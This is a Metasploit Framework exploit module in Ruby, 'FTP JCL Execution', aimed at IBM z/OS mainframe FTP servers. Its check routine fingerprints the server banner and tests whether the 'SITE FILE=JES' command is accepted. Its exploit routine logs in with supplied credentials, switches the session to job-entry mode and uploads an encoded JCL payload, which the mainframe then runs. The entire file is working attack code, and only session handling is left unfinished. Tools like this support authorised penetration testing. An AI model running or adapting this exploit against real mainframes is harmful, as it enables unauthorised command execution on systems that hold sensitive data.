##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/exploit/tcp'


class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp
  include Msf::Exploit::Remote::Tcp


  def initialize(info = {})
    super(update_info(info,
      'Name'             => 'FTP JCL Execution',
      'Description'      => %q{
       The z/OS mainframe FTP server allows the execution of uploaded files. 
       Namely uploaded JCL files (a z/OS scripting language). Using JCL files
       and the FTP command "SITE FILE=JES" an FTP user is able to upload files
       and execute them on the mainframe. JCL exposes many programs to the user
       but most importantly it exposes both IKJEFT01 (for executing TSO commands)
       and BPXBATCH (for executing UNIX commands). The following exploit takes
       any mainframe FTP server, a username and password and executes the given 
       JCL payload. 
       },
      'Author'           =>
        [
          'mainframed a.k.a. soldier of fortran',
          'S&Oxballs a.k.a. chiefascot',
        ],
        'License'        => MSF_LICENSE,
        'References'     =>
        [
        ],
        'Platform'       => ['zos'],
        'Arch'           => ['zarch'],
        'Privileged'     => false,
        'Targets'        => [ ['Automatic', {}] ],
        'DisclosureDate' => 'May 12 2013',
        'DefaultOptions' =>
        {
          'DisableNops' => 'true'
        },
        'Targets'                 => [[ 'Automatic', { }]],
        'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(21),
      ], self.class )
  end


       #To Do: Define EBCDIC to ASCII conversion

  def check

    # connect to get the FTP banner and check target OS
    connect_login
    test_jes = send_cmd( ['SITE', 'FILE=JES'] )

    # disconnect and check cached self.banner
    disconnect
   
    ##
    #Check if the target system has an FTP server running on z/OS : "IBM FTP CS V1R",
    #and whether it allows the Ftp user to upload a JES file for execution by the system.
    ##
    case banner
      when /IBM FTP CS V1R/
        case test_jes 
      when /200 SITE command was accepted/ 
        print_status("Found IBM z/OS Banner and JES commands accepted")
        return Exploit::CheckCode::Vulnerable
      else
        print_status("Found IBM z/OS Banner but SITE FILE=JES failed. Try anyway!")
        return Exploit::CheckCode::Detected
    end
    
    #Return the Safe flag if system is not exploitable
    else
      print_status("We could not recognize the server banner: #{banner.strip}")
      return Exploit::CheckCode::Safe
    end
    
    #For any other responses the exploit cannot be performed on the target, return safe flag
    return Exploit::CheckCode::Safe

  end

  ##
  #Performs an exploit of the target z/OS operating system by logging into an Ftp site running
  #on a mainframe, changing the Ftp session to JCL mode, and then uploading a custom JCL file
  #that runs as the Ftp user 
  ##
  def exploit
    #Connect to server
    connect_login
  
    #Create payload
    pl = ''
    pl << payload.encoded
    #Change Ftp site to JCL mode
    sent_cmd = send_cmd( ['SITE', 'FILE=JES'] )
    print_status("Successfully switched to JES mode")
    
    #Upload the JCL file payload
    jcl_file_name = "#{Rex::Text.rand_text_alpha(8).upcase}"
    print_status("Uploading JCL file: #{jcl_file_name}")
    res = send_cmd_data(['PUT', jcl_file_name], pl, 'A')
    job_num = res.lines.first
    print_status("Job Submitted. Job number is #{job_num.split.last}")
    
    #Disconnect from zOS server  
    disconnect
    
    sleepy = 10

    print_status("Sleeping #{sleepy} seconds because mainframes are SLOW sometimes")
    sleep(sleepy)
    
    ##
    #Call the session handler? Still need to create a zOS handler 
    #to convert ASCII to EBCDIC and back for shell and meterpreter sessions
    ## 
    #handler
  end

end
